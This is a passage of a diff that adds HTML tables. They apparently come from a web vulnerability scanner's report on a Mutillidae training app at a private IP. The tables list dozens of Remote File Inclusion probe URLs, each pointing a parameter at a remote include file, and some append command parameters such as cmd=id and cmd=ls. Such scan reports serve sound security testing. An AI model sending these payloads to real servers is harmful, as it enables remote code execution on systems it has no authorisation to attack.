+      <a href="http://192.168.1.51:80/mutillidae/index.php?body=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?body=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?class_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?class_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?class_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?class_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?classified_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?classified_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?classified_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?classified_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?cms=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?cms=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?cms=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?cms=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?config[\&quot;sipssys\&quot;]=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?config[\&quot;sipssys\&quot;]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?config[\&quot;sipssys\&quot;]=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?config[\&quot;sipssys\&quot;]=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?&amp;cmd=id</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?&amp;cmd=id: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?&amp;cmd=id">http://192.168.1.51:80/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?&amp;cmd=id</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?cmd=id</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?cmd=id">http://192.168.1.51:80/mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?cmd=id</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?config_atkroot=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?config_atkroot=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?config_atkroot=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?config_atkroot=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?configuration=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?configuration=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?configuration=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?configuration=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?custom_admin_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?custom_admin_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?custom_admin_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?custom_admin_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?dateiPfad=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?dateiPfad=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?dateiPfad=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls">http://192.168.1.51:80/mutillidae/index.php?dateiPfad=https://cirt.net/public/rfiinc.txt?&amp;cmd=ls</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?de=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?de=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?de=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?de=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?dept=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?dept=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?dept=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?dept=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?do=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?do=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?do=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?do=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?exec=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?exec=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?exec=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?exec=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?ext=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?ext=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?ext=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?ext=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?faq_path=https://cirt.net/public/rfiinc.txt?&amp;cmd=id</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?faq_path=https://cirt.net/public/rfiinc.txt?&amp;cmd=id: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?faq_path=https://cirt.net/public/rfiinc.txt?&amp;cmd=id">http://192.168.1.51:80/mutillidae/index.php?faq_path=https://cirt.net/public/rfiinc.txt?&amp;cmd=id</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?file_name[]=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?file_name[]=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?file_name[]=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?file_name[]=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?file_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?file_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?file_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?file_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?fileloc=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?fileloc=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?fileloc=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?fileloc=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?from=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?from=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?from=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?from=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?func=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?func=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?func=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?func=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?function=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?function=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?function=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?function=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?function=custom&amp;custom=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?function=custom&amp;custom=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?function=custom&amp;custom=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?function=custom&amp;custom=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?gOo=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?gOo=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?gOo=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?gOo=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?gen=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?gen=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?gen=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?gen=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?get=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?get=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?get=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?get=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?home_name=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?home_name=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?home_name=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?home_name=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?ilang=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?ilang=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?ilang=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?ilang=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?includeDir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
